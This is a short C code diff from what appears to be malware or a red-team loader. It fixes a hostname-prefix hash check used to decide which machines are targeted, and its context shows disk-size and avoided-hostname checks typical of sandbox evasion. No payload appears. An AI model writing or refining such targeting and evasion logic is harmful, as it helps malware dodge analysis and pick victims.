@@ -60,7 +60,8 @@ int get_disk_size(HMODULE hKernel32dll) {
 
 unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right) {
     unsigned int hash = 0;
-    for (size_t i = 0; i < strlen(str); i++) {
+    size_t str_len = strlen(str);
+    for (size_t i = 0; i < str_len; i++) {
         if (is_rotation_right) {
             hash = (hash >> rotation_value) | (hash << (32 - rotation_value));
         } else {
@@ -75,17 +76,24 @@ bool is_target_hostname(const char* hostname) {
     if (TARGET_HOSTNAME_PREFIX_HASH.value == 0) {
         return true;
     }
+
     unsigned int current_hash = 0;
-    for (size_t i = 0; hostname[i] != '\0'; i++) {
-        current_hash = RO(hostname, TARGET_HOSTNAME_PREFIX_HASH.rotation_value, TARGET_HOSTNAME_PREFIX_HASH.is_rotation_right);
-        
+    char buffer[256];
+
+    for (size_t i = 0; hostname[i] != '\0' && i < sizeof(buffer) - 1; i++) {
+        buffer[i] = hostname[i];
+        buffer[i + 1] = '\0';
+
+        current_hash = RO(buffer, TARGET_HOSTNAME_PREFIX_HASH.rotation_value, TARGET_HOSTNAME_PREFIX_HASH.is_rotation_right);
+        printf("buffer: %s & hash = %d\n", buffer, current_hash);
+
         if (current_hash == TARGET_HOSTNAME_PREFIX_HASH.value) {
             return true;
         }
     }
+
     return false;
 }
-
 
 bool is_avoided_hostname(const char* hostname) {
     ObjHash tmp_hash;
